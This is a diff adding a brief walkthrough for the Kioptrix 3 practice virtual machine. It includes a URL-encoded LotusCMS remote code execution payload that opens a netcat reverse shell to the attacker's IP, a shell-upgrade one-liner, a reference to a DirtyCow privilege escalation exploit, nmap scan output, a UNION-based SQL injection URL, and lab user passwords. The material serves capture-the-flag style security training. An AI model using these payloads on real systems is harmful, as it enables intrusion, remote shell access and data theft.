@@ -1,0 +1,52 @@
+Method 1:
+Description:
+This VM is vulnerable to two exploits namely Remote Code Execution and Privilege escaltion through DirtyCow Exploit.
+First of all there is a CMS by the name LotusCMS on port 80 of version 3.0 which is vulnerable to Remote Code Execution.This can be exploited using the below address.
+You just need to change the ip address to yours.
+After getting reverse shell, we have to come out from restricted shell which can be done using python -c 'import pty; pty.spawn("/bin/sh")'
+After we get interactive shell, we will do some system information gathering. It turns out to be Linux Kernel 2.6.24 which is vulnerable to the below exploit.
+Exploit --> 40839.c in exploit-db.com
+
+
+
+Exploit for Reverse Shell:
+       -->192.168.56.104/index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20192.168.56.1%201234%27%29%7D%3B%23%22
+
+
+
+# Nmap 7.91 scan initiated Thu Mar 11 04:55:26 2021 as: nmap -v -A -p- -oN nmap_result 192.168.56.104
+Nmap scan report for 192.168.56.104
+Host is up (0.013s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar 11 04:55:37 2021 -- 1 IP address (1 host up) scanned in 10.87 seconds
+
+
+
+
+Method 2:
+
+SQL Injection Query that is vulnerable.
+http://kioptrix3.com/gallery/gallery.php?id=1%20union%20all%20select%201,user(),database(),4,5,6%20--%20#
+
+
+Username : dreg   Password:Mast3r 
+Username : loneferret Password:starwars
